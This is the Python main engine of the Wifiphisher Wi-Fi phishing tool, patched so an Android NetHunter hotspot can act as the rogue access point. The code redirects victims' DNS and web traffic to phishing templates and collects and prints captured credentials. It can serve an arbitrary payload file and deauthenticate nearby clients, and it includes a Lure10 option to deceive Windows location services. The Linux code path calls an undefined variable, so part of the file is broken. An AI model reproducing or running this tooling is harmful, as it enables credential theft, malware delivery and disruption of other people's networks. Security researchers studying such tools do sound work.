#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# pylint: skip-file
"""
Wifiphisher main engine — patched for NetHunter.
--nethunter flag uses Android native hotspot instead of hostapd.
"""
import subprocess
import os
import logging
import logging.config
import time
import sys
import argparse
import fcntl
import curses
import socket
import struct
import signal
import re
from threading import Thread
from subprocess import Popen, PIPE, check_output
from shutil import copyfile
from wifiphisher.common.constants import *
import wifiphisher.common.constants as constants  # for dynamic GW_IP access
import wifiphisher.common.extensions as extensions
import wifiphisher.common.recon as recon
import wifiphisher.common.phishingpage as phishingpage
import wifiphisher.common.phishinghttp as phishinghttp
import wifiphisher.common.macmatcher as macmatcher
import wifiphisher.common.interfaces as interfaces
import wifiphisher.common.firewall as firewall
import wifiphisher.common.accesspoint as accesspoint
import wifiphisher.common.tui as tui
import wifiphisher.common.opmode as opmode

logger = logging.getLogger(__name__)

# Global references for signal handler cleanup
_cleanup_iface = None
_cleanup_port = None

def _emergency_cleanup(signum=None, frame=None):
    """
    Emergency cleanup — removes iptables rules that would break
    Android hotspot if left behind after crash/SIGTERM.
    """
    global _cleanup_iface, _cleanup_port
    iface = _cleanup_iface
    port = _cleanup_port
    if iface and port:
        for proto in ['udp', 'tcp']:
            subprocess.call(
                'iptables -t nat -D PREROUTING -i %s -p %s --dport 53 '
                '-j REDIRECT --to-port %d 2>/dev/null' % (iface, proto, port),
                shell=True)
        subprocess.call(
            'iptables -t nat -D PREROUTING -i %s -p tcp --dport 80 '
            '-j DNAT 2>/dev/null' % iface, shell=True)
        subprocess.call(
            'iptables -t nat -D PREROUTING -i %s -p tcp --dport 443 '
            '-j DNAT 2>/dev/null' % iface, shell=True)
    elif iface:
        # Port unknown — flush all PREROUTING
        for _ in range(5):
            ret = subprocess.call(
                'iptables -t nat -D PREROUTING -i %s -p udp --dport 53 '
                '-j REDIRECT 2>/dev/null' % iface, shell=True)
            if ret != 0:
                break
    subprocess.call("pkill -f 'dnsmasq.*dhcpd.conf' 2>/dev/null", shell=True)
    if signum is not None:
        sys.exit(1)

signal.signal(signal.SIGTERM, _emergency_cleanup)
import atexit
atexit.register(_emergency_cleanup)

# Fixes UnicodeDecodeError for ESSIDs
try:
    reload(sys)
    sys.setdefaultencoding('utf8')
except (NameError, AttributeError):
    # Python 3 doesn't need this
    pass


def parse_args():
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-eI", "--extensionsinterface",
        help=("Manually choose an interface that supports monitor mode for "
              "deauthenticating the victims. Example: -jI wlan1"))
    parser.add_argument(
        "-aI", "--apinterface",
        type=opmode.validate_ap_interface,
        help=("Manually choose an interface that supports AP mode for "
              "spawning an AP. Example: -aI wlan0"))
    parser.add_argument(
        "-iI", "--internetinterface",
        help=("Choose an interface that is connected on the Internet. "
              "Example: -iI ppp0"))
    parser.add_argument(
        "-nE", "--noextensions",
        help="Do not load any extensions.",
        action='store_true')
    parser.add_argument(
        "-nD", "--nodeauth",
        help="Skip the deauthentication phase.",
        action='store_true')
    parser.add_argument(
        "-e", "--essid",
        help=("Enter the ESSID of the rogue Access Point. "
              "This option will skip Access Point selection phase. "
              "Example: --essid 'Free WiFi'"))
    parser.add_argument(
        "-dE", "--deauth-essid",
        help=("Deauth all the BSSIDs having same ESSID from AP selection or "
              "the ESSID given by -e option"),
        action='store_true')
    parser.add_argument(
        "-p", "--phishingscenario",
        help=("Choose the phishing scenario to run. "
              "This option will skip the scenario selection phase. "
              "Example: -p firmware_upgrade"))
    parser.add_argument(
        "-pK", "--presharedkey",
        help=("Add WPA/WPA2 protection on the rogue Access Point. "
              "Example: -pK s3cr3tp4ssw0rd"))
    parser.add_argument(
        "-hC", "--handshake-capture",
        help=("Capture of the WPA/WPA2 handshakes for verifying passphrase. "
              "Example : -hC capture.pcap"))
    parser.add_argument(
        "-qS", "--quitonsuccess",
        help="Stop the script after successfully retrieving one pair of credentials",
        action='store_true')
    parser.add_argument(
        "-lC", "--lure10-capture",
        help=("Capture the BSSIDs of the APs that are discovered during "
              "AP selection phase. This option is part of Lure10 attack."),
        action='store_true')
    parser.add_argument(
        "-lE", "--lure10-exploit",
        help=("Fool the Windows Location Service of nearby Windows users "
              "to believe it is within an area that was previously captured "
              "with --lure10-capture. Part of the Lure10 attack."))
    parser.add_argument(
        "-iAM", "--mac-ap-interface",
        help="Specify the MAC address of the AP interface")
    parser.add_argument(
        "-iEM", "--mac-extensions-interface",
        help="Specify the MAC address of the extensions interface")
    parser.add_argument(
        "-iNM", "--no-mac-randomization",
        help="Do not change any MAC address",
        action='store_true')
    parser.add_argument(
        "--logging", help="Log activity to file", action="store_true")
    parser.add_argument(
        "--payload-path",
        help="Payload path for scenarios serving a payload")
    parser.add_argument(
        "-cM", "--channel-monitor",
        help="Monitor if target access point changes the channel.",
        action="store_true")
    parser.add_argument(
        "-wP", "--wps-pbc",
        help="Monitor if the button on a WPS-PBC Registrar is pressed.",
        action="store_true")
    parser.add_argument(
        "-wAI", "--wpspbc-assoc-interface",
        help="The WLAN interface used for associating to the WPS AccessPoint.")
    parser.add_argument(
        "-kB", "--known-beacons",
        help="Broadcast a number of beacon frames advertising popular WLANs",
        action='store_true')

    # ---- NetHunter additions ----
    parser.add_argument(
        "--nethunter",
        help=("NetHunter mode: use Android native hotspot instead of hostapd. "
              "Turn on Android Hotspot BEFORE running wifiphisher."),
        action='store_true')
    parser.add_argument(
        "--hotspot-iface",
        help="Force hotspot interface (NetHunter mode). Default: auto-detect.")
    parser.add_argument(
        "--hotspot-ip",
        help="Force hotspot gateway IP (NetHunter mode). Default: auto-detect.")

    return parser.parse_args()


VERSION = "1.4-nh"
args = parse_args()
APs = {}


def setup_logging(args):
    root_logger = logging.getLogger()
    if args.logging:
        logging.config.dictConfig(LOGGING_CONFIG)
        should_roll_over = False
        if os.path.isfile(LOG_FILEPATH) and os.path.getsize(LOG_FILEPATH) > 0:
            should_roll_over = True
        should_roll_over and root_logger.handlers[0].doRollover()
        logger.info("Starting Wifiphisher")


def set_ip_fwd():
    Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'], stdout=DN, stderr=PIPE)


def set_route_localnet():
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN, stderr=PIPE)


def kill_interfering_procs():
    """Kill interfering processes. On NetHunter, be more careful."""
    try:
        subprocess.Popen(
            ['service', 'network-manager', 'stop'],
            stdout=subprocess.PIPE, stderr=DN)
        subprocess.Popen(
            ['service', 'NetworkManager', 'stop'],
            stdout=subprocess.PIPE, stderr=DN)
        subprocess.Popen(
            ['service', 'avahi-daemon', 'stop'],
            stdout=subprocess.PIPE, stderr=DN)
    except OSError:
        pass

    proc = Popen(['ps', '-A'], stdout=subprocess.PIPE)
    output = proc.communicate()[0]
    sys_procs = output.splitlines()
    for interfering_proc in INTERFERING_PROCS:
        for proc in sys_procs:
            if interfering_proc in proc.decode('utf-8', errors='replace'):
                pid = int(proc.split(None, 1)[0])
                print('[' + G + '+' + W + "] Sending SIGKILL to " +
                      interfering_proc)
                os.kill(pid, signal.SIGKILL)


class WifiphisherEngine:
    def __init__(self):
        self.mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
        self.network_manager = interfaces.NetworkManager()
        self.template_manager = None  # Created later in start() or _start_nethunter()
        self.access_point = accesspoint.AccessPoint()
        self.fw = firewall.Fw()
        self.em = extensions.ExtensionManager(self.network_manager)
        self.opmode = opmode.OpMode()

    def stop(self):
        if DEV:
            print("[" + G + "+" + W + "] Show your support!")
            print("[" + G + "+" + W + "] Follow us: https://twitter.com/wifiphisher")
            print("[" + G + "+" + W + "] Like us: https://www.facebook.com/Wifiphisher")
        print("[" + G + "+" + W + "] Captured credentials:")
        for cred in phishinghttp.creds:
            logger.info("Creds: %s", cred)
            print(cred)

        self.em.on_exit()
        self.access_point.on_exit()
        self.network_manager.on_exit()
        if self.template_manager:
            self.template_manager.on_exit()
        self.fw.on_exit()

        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
            os.remove('/tmp/wifiphisher-webserver.tmp')

        print('[' + R + '!' + W + '] Closing')
        sys.exit(0)

    def try_change_mac(self, iface_name, mac_address=None):
        try:
            if mac_address is not None:
                self.network_manager.set_interface_mac(iface_name, mac_address)
            else:
                self.network_manager.set_interface_mac_random(iface_name)
        except interfaces.InvalidMacAddressError as err:
            print("[{0}!{1}] {2}".format(R, W, err))

    def start(self):
        global args, APs
        args = parse_args()

        setup_logging(args)

        # ============================================================
        # NETHUNTER MODE
        # ============================================================
        if args.nethunter:
            return self._start_nethunter(args)

        # ============================================================
        # ORIGINAL LINUX MODE (unchanged except for Python 2/3 compat)
        # ============================================================
        self.opmode.initialize(args)
        self.opmode.set_opmode(args, self.network_manager)

        if os.geteuid():
            logger.error("Non root user detected")
            sys.exit('[' + R + '-' + W + '] Please run as root')

        self.network_manager.start()

        try:
            if self.opmode.internet_sharing_enabled():
                self.network_manager.internet_access_enable = True
                if self.network_manager.is_interface_valid(
                        args.internetinterface, "internet"):
                    internet_interface = args.internetinterface
                    if interfaces.is_wireless_interface(internet_interface):
                        self.network_manager.unblock_interface(
                            internet_interface)
                logger.info("Selecting %s interface for accessing internet",
                            args.internetinterface)
            if self.opmode.assoc_enabled():
                if self.network_manager.is_interface_valid(
                        args.wpspbc_assoc_interface, "WPS"):
                    logger.info("Selecting %s interface for WPS association",
                                args.wpspbc_assoc_interface)
            if self.opmode.extensions_enabled():
                if args.extensionsinterface and args.apinterface:
                    if self.network_manager.is_interface_valid(
                            args.extensionsinterface, "monitor"):
                        mon_iface = args.extensionsinterface
                        self.network_manager.unblock_interface(mon_iface)
                    if self.network_manager.is_interface_valid(
                            args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    mon_iface, ap_iface = self.network_manager.get_interface_automatically()
                logger.info(
                    "Selecting {} for deauthentication and {} for the rogue Access Point"
                    .format(mon_iface, ap_iface))
                print(
                    "[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
                    "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
                    "rogue Access Point".format(G, W, mon_iface, ap_iface))

                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.try_change_mac(ap_iface, args.mac_ap_interface)
                    else:
                        self.try_change_mac(ap_iface)
                    if args.mac_extensions_interface:
                        self.try_change_mac(mon_iface, args.mac_extensions_interface)
                    else:
                        self.try_change_mac(mon_iface)
            if not self.opmode.extensions_enabled():
                if args.apinterface:
                    if self.network_manager.is_interface_valid(
                            args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    ap_iface = self.network_manager.get_interface(True, False)
                mon_iface = ap_iface

                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.try_change_mac(ap_iface, args.mac_ap_interface)
                    else:
                        self.try_change_mac(ap_iface)

                print(
                    "[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
                    "rogue Access Point".format(G, W, ap_iface))
                logger.info("Selecting {} interface for rouge access point"
                            .format(ap_iface))

            logger.info("Unblocking interfaces")
            self.network_manager.unblock_interface(ap_iface)
            self.network_manager.unblock_interface(mon_iface)
            if self.opmode.extensions_enabled() or args.essid is None:
                self.network_manager.set_interface_mode(mon_iface, "monitor")
        except (interfaces.InvalidInterfaceError,
                interfaces.InterfaceCantBeFoundError,
                interfaces.InterfaceManagedByNetworkManagerError) as err:
            logger.exception("The following error has occurred:")
            print("[{0}!{1}] {2}".format(R, W, err))
            time.sleep(1)
            self.stop()

        if not args.internetinterface:
            kill_interfering_procs()
            logger.info("Killing all interfering processes")

        rogue_ap_mac = self.network_manager.get_interface_mac(ap_iface)
        if not args.no_mac_randomization:
            logger.info("Changing {} MAC address to {}".format(
                ap_iface, rogue_ap_mac))
            print("[{0}+{1}] Changing {2} MAC addr (BSSID) to {3}".format(
                G, W, ap_iface, rogue_ap_mac))

            if self.opmode.extensions_enabled():
                mon_mac = self.network_manager.get_interface_mac(mon_iface)
                logger.info("Changing {} MAC address to {}".format(
                    mon_iface, mon_mac))
                print("[{0}+{1}] Changing {2} MAC addr to {3}".format(
                    G, W, mon_iface, mon_mac))

        if self.opmode.internet_sharing_enabled():
            self.fw.nat(ap_iface, args.internetinterface)
            set_ip_fwd()
        else:
            self.fw.redirect_requests_localhost()
        set_route_localnet()

        print('[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables')
        time.sleep(1)

        if args.essid:
            essid = args.essid
            channel = str(CHANNEL)
            target_ap_mac = None
            enctype = None
        else:
            self.network_manager.up_interface(mon_iface)
            ap_info_object = tui.ApSelInfo(mon_iface, self.mac_matcher,
                                           self.network_manager, args)
            ap_sel_object = tui.TuiApSel()
            access_point = curses.wrapper(ap_sel_object.gather_info,
                                          ap_info_object)
            if access_point:
                essid = access_point.get_name()
                channel = access_point.get_channel()
                target_ap_mac = access_point.get_mac_address()
                enctype = access_point.get_encryption()
            else:
                self.stop()

        self.template_manager = phishingpage.TemplateManager()
        tui_template_obj = tui.TuiTemplateSelection()
        template = tui_template_obj.gather_info(args.phishingscenario,
                                                self.template_manager)
        logger.info("Selecting {} template".format(template.get_display_name()))
        print("[" + G + "+" + W + "] Selecting " +
              template.get_display_name() + " template")

        if template.has_payload():
            payload_path = args.payload_path
            while not payload_path or not os.path.isfile(payload_path):
                payload_path = raw_input(
                    "[" + G + "+" + W + "] Enter the [" + G + "full path" + W +
                    "] to the payload you wish to serve: ")
                if not os.path.isfile(payload_path):
                    print('[' + R + '-' + W + '] Invalid file path!')
            print('[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload ')
            template.update_payload_path(os.path.basename(payload_path))
            copyfile(payload_path,
                     PHISHING_PAGES_DIR + template.get_payload_path())

        APs_context = []
        for i in APs:
            APs_context.append({
                'channel': APs[i][0] or "",
                'essid': APs[i][1] or "",
                'bssid': APs[i][2] or "",
                'vendor': self.mac_matcher.get_vendor_name(APs[i][2]) or ""
            })

        template.merge_context({'APs': APs_context})

        ap_logo_path = False
        if target_ap_mac is not None:
            ap_logo_path = template.use_file(
                self.mac_matcher.get_vendor_logo_path(target_ap_mac))

        template.merge_context({
            'target_ap_channel': channel or "",
            'target_ap_essid': essid or "",
            'target_ap_bssid': target_ap_mac or "",
            'target_ap_encryption': enctype or "",
            'target_ap_vendor': self.mac_matcher.get_vendor_name(target_ap_mac) or "",
            'target_ap_logo_path': ap_logo_path or ""
        })
        if args.wps_pbc:
            template.merge_context({'wps_pbc_attack': "1"})
        else:
            template.merge_context({'wps_pbc_attack': "0"})

        self.network_manager.set_interface_mode(ap_iface, "managed")
        self.network_manager.up_interface(ap_iface)
        self.access_point.set_interface(ap_iface)
        self.access_point.set_channel(channel)
        self.access_point.set_essid(essid)
        if args.wpspbc_assoc_interface:
            wps_mac = self.network_manager.get_interface_mac(
                args.wpspbc_assoc_interface)
            self.access_point.add_deny_macs([wps_mac])
        if args.presharedkey:
            self.access_point.set_psk(args.presharedkey)
        if self.opmode.internet_sharing_enabled():
            self.access_point.set_internet_interface(args.internetinterface)
        print('[' + T + '*' + W + '] Starting the fake access point...')
        try:
            self.access_point.start()
            self.access_point.start_dhcp_dns()
        except BaseException:
            self.stop()

        if self.opmode.extensions_enabled():
            shared_data = {
                'is_freq_hop_allowed': self.opmode.freq_hopping_enabled(),
                'target_ap_channel': channel or "",
                'target_ap_essid': essid or "",
                'target_ap_bssid': target_ap_mac or "",
                'target_ap_encryption': enctype or "",
                'target_ap_logo_path': ap_logo_path or "",
                'rogue_ap_mac': rogue_ap_mac,
                'APs': APs_context,
                'args': args
            }
            self.network_manager.up_interface(mon_iface)
            self.em.set_interface(mon_iface)
            ext_list = DEFAULT_EXTENSIONS
            if args.lure10_exploit:
                ext_list.append(LURE10_EXTENSION)
            if args.handshake_capture:
                ext_list.append(HANDSHAKE_VALIDATE_EXTENSION)
            if args.nodeauth:
                ext_list.remove(DEAUTH_EXTENSION)
            if args.wps_pbc:
                ext_list.append(WPSPBC)
            if args.known_beacons:
                ext_list.append(KNOWN_BEACONS_EXTENSION)
            self.em.set_extensions(ext_list)
            self.em.init_extensions(shared_data)
            self.em.start_extensions()

        if not self.opmode.internet_sharing_enabled():
            print('[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' +
                  str(PORT) + ", " + str(SSL_PORT))
            webserver = Thread(
                target=phishinghttp.runHTTPServer,
                args=(NETWORK_GW_IP, PORT, SSL_PORT, template, self.em))
            webserver.daemon = True
            webserver.start()
            time.sleep(1.5)

        self.mac_matcher.unbind()

        clients_APs = []
        APs = []

        try:
            # Pass all required fields to TUI via dictionary
            # tui.py expects: version, essid, channel, ap_iface, em, accesspoint, phishinghttp
            main_info = {
                "version": VERSION,
                "essid": essid,
                "channel": channel,
                "ap_iface": ap_iface,
                "em": self.em,
                "phishinghttp": phishinghttp,  # FIX: add phishinghttp module
                "accesspoint": self.access_point,  # FIX: pass AccessPoint instance
                "is_freq_hop_allowed": self.opmode.is_freq_hop_allowed(),
                "roguehostpd_object": rogue_ap_object,
                "args": args,
                "jam_options": [],
                "deauth_options": [],
                "is_advanced_enabled": False
            }
            tui_main_object = tui.TuiMain()
            curses.wrapper(tui_main_object.gather_info, main_info)
            self.stop()
        except KeyboardInterrupt:
            self.stop()

    # ============================================================
    # NETHUNTER MODE — full alternate code path
    # ============================================================
    def _start_nethunter(self, args):
        """
        NetHunter mode: uses Android native hotspot.
        No hostapd, no roguehostapd, no pyric interface detection.
        Requires: Android Hotspot already ON.
        """
        print()
        print("=" * 60)
        print("[" + C + "*" + W + "] NetHunter mode \u2014 using Android native hotspot")
        print("=" * 60)

        # Root check
        if os.geteuid():
            sys.exit('[' + R + '-' + W + '] Please run as root')

        args.no_mac_randomization = True

        # Deauth support: if user specified -eI, enable extensions
        nethunter_extensions = False
        mon_iface = None
        if hasattr(args, 'extensionsinterface') and args.extensionsinterface:
            mon_iface = args.extensionsinterface
            nethunter_extensions = True
            print("[" + G + "+" + W + "] Deauth interface: " + C + mon_iface + W)
        else:
            print("[ ] Deauth disabled (use " + C + "-eI wlan1" + W + " to enable)")

        # Enable NetHunter mode on all subsystems
        self.network_manager.enable_nethunter_mode()
        self.opmode.op_mode = constants.OP_MODE_NETHUNTER
        self.network_manager.start()

        # Detect Android hotspot
        hotspot_ok = self.access_point.enable_nethunter_mode(
            hotspot_iface=args.hotspot_iface,
            hotspot_ip=args.hotspot_ip
        )
        if not hotspot_ok:
            print()
            print("[" + R + "!" + W + "] Android hotspot not detected!")
            print("[" + R + "!" + W + "] Turn ON hotspot in Android Settings, then retry.")
            print("[" + R + "!" + W + "] Or specify: " + C +
                  "--hotspot-iface wlan2 --hotspot-ip 192.168.43.1" + W)
            # Show current interfaces for debugging
            try:
                output = subprocess.check_output(
                    ['ip', '-4', 'addr', 'show'], stderr=subprocess.PIPE
                ).decode('utf-8', errors='replace')
                print()
                print("[" + T + "*" + W + "] Current interfaces:")
                for line in output.splitlines():
                    if 'inet ' in line or ': <' in line:
                        print("    " + line.strip())
            except (subprocess.CalledProcessError, OSError):
                pass
            sys.exit(1)

        ap_iface = self.access_point.interface
        gw_ip = constants.NETWORK_GW_IP

        # ---- Interface mismatch warning ----
        mismatch = self.access_point.get_iface_mismatch()
        if mismatch:
            req_iface, det_iface = mismatch
            print()
            print("[" + O + "\u26a0" + W + "] WARNING: " + C + "--hotspot-iface " +
                  req_iface + W + " has no active hotspot!")
            print("[" + O + "\u26a0" + W + "] Detected active hotspot on " +
                  C + det_iface + W + " instead")
            print("[" + O + "\u26a0" + W + "] Make sure the Android hotspot is ON " +
                  "before starting wifiphisher")
            print("[" + O + "\u26a0" + W + "] Press " + C + "Ctrl+C" + W +
                  " to abort, or wait 5s to continue with " + C + det_iface + W + "...")
            try:
                for i in range(5, 0, -1):
                    sys.stdout.write("\r[" + O + "\u26a0" + W +
                                     "] Continuing in %ds...  " % i)
                    sys.stdout.flush()
                    time.sleep(1)
                sys.stdout.write("\r" + " " * 40 + "\r")
                sys.stdout.flush()
            except KeyboardInterrupt:
                print("\n[" + R + "!" + W + "] Aborted by user")
                sys.exit(1)

        print("[" + G + "+" + W + "] Hotspot interface: " + C + ap_iface + W)
        print("[" + G + "+" + W + "] Gateway IP: " + C + gw_ip + W)

        # Setup iptables — DON'T call fw.redirect_requests_localhost() here!
        # In NetHunter mode, accesspoint.start_dhcp_dns() sets up ALL rules:
        #   DNS REDIRECT → our wildcard dnsmasq
        #   HTTP DNAT → tornado :8080
        #   HTTPS DNAT → tornado :443
        # Calling fw.redirect_requests_localhost() would add DNAT DNS→:53
        # which sends DNS to Android's dnsmasq (real DNS) BEFORE our REDIRECT
        # → no wildcard → no captive portal!
        set_ip_fwd()
        set_route_localnet()
        print('[' + T + '*' + W + '] iptables configured')

        # Auto-detect ESSID and channel from hotspot interface
        essid = None
        channel = None
        try:
            iw_output = subprocess.check_output(
                ['iw', 'dev', ap_iface, 'info'], stderr=subprocess.PIPE
            ).decode('utf-8', errors='replace')
            m_ssid = re.search(r'^\s*ssid\s+(.+)$', iw_output, re.MULTILINE)
            if m_ssid:
                essid = m_ssid.group(1).strip()
            m_ch = re.search(r'channel\s+(\d+)\s', iw_output)
            if m_ch:
                channel = m_ch.group(1)
        except (subprocess.CalledProcessError, OSError):
            pass

        # Override with -e if specified
        if args.essid:
            essid = args.essid

        # Fallbacks
        if not essid:
            essid = self.access_point.get_android_ssid() or "Android_Hotspot"
        if not channel:
            channel = str(CHANNEL)

        print("[" + G + "+" + W + "] ESSID: " + C + essid + W)
        print("[" + G + "+" + W + "] Channel: " + C + channel + W)

        target_ap_mac = None
        enctype = None

        # Template selection
        self.template_manager = phishingpage.TemplateManager()
        tui_template_obj = tui.TuiTemplateSelection()
        template = tui_template_obj.gather_info(args.phishingscenario,
                                                self.template_manager)
        logger.info("Selecting {} template".format(template.get_display_name()))
        print("[" + G + "+" + W + "] Selecting " +
              C + template.get_display_name() + W + " template")

        # Payload
        if template.has_payload():
            payload_path = args.payload_path
            while not payload_path or not os.path.isfile(payload_path):
                try:
                    payload_path = raw_input(
                        "[" + G + "+" + W + "] Enter the full path to the payload: ")
                except NameError:
                    payload_path = input(
                        "[" + G + "+" + W + "] Enter the full path to the payload: ")
                if not os.path.isfile(payload_path):
                    print('[' + R + '-' + W + '] Invalid file path!')
            template.update_payload_path(os.path.basename(payload_path))
            copyfile(payload_path,
                     PHISHING_PAGES_DIR + template.get_payload_path())

        rogue_ap_mac = self.network_manager.get_interface_mac(ap_iface)

        template.merge_context({
            'APs': [],
            'target_ap_channel': channel,
            'target_ap_essid': essid,
            'target_ap_bssid': target_ap_mac or "",
            'target_ap_encryption': enctype or "",
            'target_ap_vendor': "",
            'target_ap_logo_path': "",
            'wps_pbc_attack': "0"
        })

        # Start the AP (NetHunter mode: no hostapd, just kernel tweaks)
        print('[' + T + '*' + W + '] Starting fake access point (NetHunter)...')
        try:
            self.access_point.set_essid(essid)
            self.access_point.set_channel(channel)
            self.access_point.start()          # Kernel tweaks + SSID change
            self.access_point.start_dhcp_dns() # DNS wildcard + ALL iptables
            # Register for emergency cleanup
            global _cleanup_iface, _cleanup_port
            _cleanup_iface = ap_iface
            _cleanup_port = self.access_point._dns_port
        except BaseException as e:
            print("[" + R + "!" + W + "] AP setup failed: " + str(e))
            import traceback
            traceback.print_exc()
            self.stop()

        # Start HTTP server
        print('[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' +
              C + str(PORT) + W + ", " + C + str(SSL_PORT) + W)
        webserver = Thread(
            target=phishinghttp.runHTTPServer,
            args=(gw_ip, PORT, SSL_PORT, template, self.em))
        webserver.daemon = True
        webserver.start()
        time.sleep(1.5)

        # ---- Start extensions (deauth) if enabled ----
        if nethunter_extensions and mon_iface:
            print("[" + T + "*" + W + "] Starting deauth on " + C + mon_iface + W + "...")
            try:
                # Put monitor interface in monitor mode
                subprocess.call(['ip', 'link', 'set', mon_iface, 'down'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.call(['iw', 'dev', mon_iface, 'set', 'type', 'monitor'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.call(['ip', 'link', 'set', mon_iface, 'up'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                # Set channel on monitor iface to match target
                target_ch = channel or str(constants.CHANNEL)
                subprocess.call(
                    ['iw', 'dev', mon_iface, 'set', 'channel', target_ch],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                print("[" + G + "+" + W + "] " + C + mon_iface +
                      W + " in monitor mode (ch " + C + target_ch + W + ")")

                # Ensure args has all attributes deauth.py expects
                if not hasattr(args, 'deauth_essid'):
                    args.deauth_essid = None
                if not hasattr(args, 'deauth_channels'):
                    args.deauth_channels = []
                if not hasattr(args, 'channel_monitor'):
                    args.channel_monitor = False

                # NetworkManager shim — ExtensionManager needs an object
                # with set_interface_channel(). On NetHunter we use iw directly.
                class _NMShim(object):
                    def set_interface_channel(self, iface, ch):
                        subprocess.call(
                            ['iw', 'dev', iface, 'set', 'channel', str(ch)],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                # ExtensionManager init sequence (must be in this order):
                # 1. Create EM with NetworkManager (or shim)
                self.em = extensions.ExtensionManager(_NMShim())
                # 2. Set monitor interface → opens L2Socket for scapy
                self.em.set_interface(mon_iface)
                # 3. Register which extensions to load
                self.em.set_extensions(['deauth'])
                # 4. Init extensions with shared_data dict
                #    (converted to namedtuple internally by EM)
                shared_data = {
                    'is_freq_hop_allowed': False,
                    'target_ap_channel': target_ch,
                    'target_ap_essid': essid,
                    'target_ap_bssid': target_ap_mac or "",
                    'rogue_ap_mac': rogue_ap_mac or "00:00:00:00:00:00",
                    'ap_channel': target_ch,
                    'args': args,
                }
                self.em.init_extensions(shared_data)
                # 5. Start listen + send threads
                self.em.start_extensions()
                print("[" + G + "+" + W + "] Deauth active \u2014 extensions feed updating")
            except Exception as e:
                print("[" + R + "!" + W + "] Deauth setup failed: " + str(e))
                import traceback
                traceback.print_exc()

        self.mac_matcher.unbind()

        # Main loop (TUI)
        try:
            # NetHunter: pass all required fields to TUI via dictionary
            # tui.py expects: version, essid, channel, ap_iface, em, accesspoint, phishinghttp
            main_info = {
                "version": VERSION,
                "essid": essid,
                "channel": channel,
                "ap_iface": ap_iface,
                "em": self.em,
                "phishinghttp": phishinghttp,  # FIX: add phishinghttp module
                "accesspoint": self.access_point,  # FIX: pass AccessPoint instance
                "is_freq_hop_allowed": False,
                "roguehostpd_object": None,
                "args": args,
                "jam_options": [],
                "deauth_options": [],
                "is_advanced_enabled": False
            }
            tui_main_object = tui.TuiMain()
            curses.wrapper(tui_main_object.gather_info, main_info)
            self.stop()
        except KeyboardInterrupt:
            self.stop()


def run():
    try:
        today = time.strftime("%Y-%m-%d %H:%M")
        print('[' + T + '*' + W + '] Starting Wifiphisher %s ( %s ) at %s' %
              (VERSION, WEBSITE, today))
        if BIRTHDAY in today:
            print('[' + T + '*' + W +
                  '] Wifiphisher was first released on this day in 2015! '
                  'Happy birthday!')
        if NEW_YEAR in today:
            print('[' + T + '*' + W + '] Happy new year!')
        engine = WifiphisherEngine()
        engine.start()
    except KeyboardInterrupt:
        print(R + '\n (^C)' + O + ' interrupted\n' + W)
    except EOFError:
        print(R + '\n (^D)' + O + ' interrupted\n' + W)
